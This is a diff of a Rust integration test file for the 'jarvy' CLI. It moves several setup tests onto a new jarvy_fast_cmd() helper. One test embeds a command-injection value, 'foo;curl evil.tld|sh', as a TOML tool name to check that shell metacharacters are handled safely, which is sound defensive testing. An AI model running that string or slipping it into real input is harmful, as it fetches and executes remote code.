@@ -14,7 +14,7 @@
 mod common;
 
 use assert_cmd::prelude::*;
-use common::jarvy_cmd;
+use common::{jarvy_cmd, jarvy_fast_cmd};
 use predicates::prelude::*;
 use std::io::Write;
 use tempfile::NamedTempFile;
@@ -211,14 +211,13 @@ totally-fake-tool-xyz = "1.0"
     )
     .unwrap();
 
-    let mut c = jarvy_cmd();
-    // JARVY_FAST_TEST skips actual command execution so we don't hit
-    // the host's package manager during the test. Telemetry stays off.
-    // JARVY_SANDBOX=0 disables sandbox auto-detection so the test runs
-    // the same way on Claude Code / containerized CI as on bare metal
-    // (otherwise seamless mode flips the renderer into `Sent` and the
-    // fallback URL gets suppressed).
-    c.env("JARVY_FAST_TEST", "1");
+    // jarvy_fast_cmd() bundles JARVY_TEST_MODE + JARVY_FAST_TEST so we
+    // skip actual command execution and don't hit the host's package
+    // manager. Telemetry stays off. JARVY_SANDBOX=0 disables sandbox
+    // auto-detection so the test runs the same way on Claude Code /
+    // containerized CI as on bare metal (otherwise seamless mode flips
+    // the renderer into `Sent` and the fallback URL gets suppressed).
+    let mut c = jarvy_fast_cmd();
     c.env("JARVY_SANDBOX", "0");
     c.args(["setup", "--file"])
         .arg(cfg.path())
@@ -257,8 +256,7 @@ totally-fake-tool-mixed = "1.0"
     )
     .unwrap();
 
-    let mut c = jarvy_cmd();
-    c.env("JARVY_FAST_TEST", "1");
+    let mut c = jarvy_fast_cmd();
     c.env("JARVY_SANDBOX", "0");
     c.args(["setup", "--file"])
         .arg(cfg.path())
@@ -286,8 +284,7 @@ seamless-fake-tool = "1.0"
     )
     .unwrap();
 
-    let mut c = jarvy_cmd();
-    c.env("JARVY_FAST_TEST", "1");
+    let mut c = jarvy_fast_cmd();
     // Force seamless on, telemetry off — the bug's reproducer.
     c.env("JARVY_SANDBOX", "1");
     c.env_remove("JARVY_TELEMETRY");
@@ -324,8 +321,7 @@ seamless-and-telem-on-fake = "1.0"
     )
     .unwrap();
 
-    let mut c = jarvy_cmd();
-    c.env("JARVY_FAST_TEST", "1");
+    let mut c = jarvy_fast_cmd();
     c.env("JARVY_SANDBOX", "1");
     c.env("JARVY_TELEMETRY", "1");
     c.args(["setup", "--file"])
@@ -351,8 +347,7 @@ fn setup_with_shell_metachar_tool_name_suppresses_scaffold() {
     // TOML quoted keys can contain any bytes; embed a fake injection.
     writeln!(cfg, "[provisioner]\n\"foo;curl evil.tld|sh\" = \"1.0\"\n").unwrap();
 
-    let mut c = jarvy_cmd();
-    c.env("JARVY_FAST_TEST", "1");
+    let mut c = jarvy_fast_cmd();
     c.env("JARVY_SANDBOX", "0");
     c.args(["setup", "--file"])
         .arg(cfg.path())
@@ -381,8 +376,7 @@ totally-fake-tool-xyz = "1.0"
     )
     .unwrap();
 
-    let mut c = jarvy_cmd();
-    c.env("JARVY_FAST_TEST", "1");
+    let mut c = jarvy_fast_cmd();
     c.env("JARVY_SANDBOX", "0");
     // Force telemetry on; endpoint doesn't need to resolve for the
     // human-renderer branch — `is_enabled()` just checks the flag.
